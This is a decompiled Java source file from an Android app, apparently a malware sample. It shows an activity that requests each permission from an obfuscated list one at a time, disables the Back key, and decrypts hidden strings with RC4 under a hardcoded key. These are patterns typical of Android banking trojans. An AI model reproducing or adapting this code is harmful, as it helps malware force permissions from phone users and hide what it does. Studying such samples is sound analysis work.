/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.util.Base64
 *  android.view.KeyEvent
 */
package com.example.mmm.Activity;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class actPermissions
extends Activity {
    constants consts = new constants();
    utils utl = new utils();

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onCreate(Bundle arrstring) {
        super.onCreate((Bundle)arrstring);
        this.utl.SettingsWrite((Context)this, "SQ", "1");
        if (Build.VERSION.SDK_INT >= 23) {
            for (String string : this.consts.pentium$) {
                if (this.checkCallingOrSelfPermission(string) == 0) continue;
                this.utl.SettingsWrite((Context)this, "SQ", "1");
                this.requestPermissions(new String[]{string}, 123);
            }
        }
        this.finish();
    }

    protected void onDestroy() {
        super.onDestroy();
    }

    public boolean onKeyDown(int n2, KeyEvent keyEvent) {
        if (n2 == 4) return true;
        if (!super.onKeyDown(n2, keyEvent)) return false;
        return true;
    }

    protected void onPause() {
        super.onPause();
    }

    protected void onResume() {
        super.onResume();
    }

    protected void onStop() {
        super.onStop();
    }
}

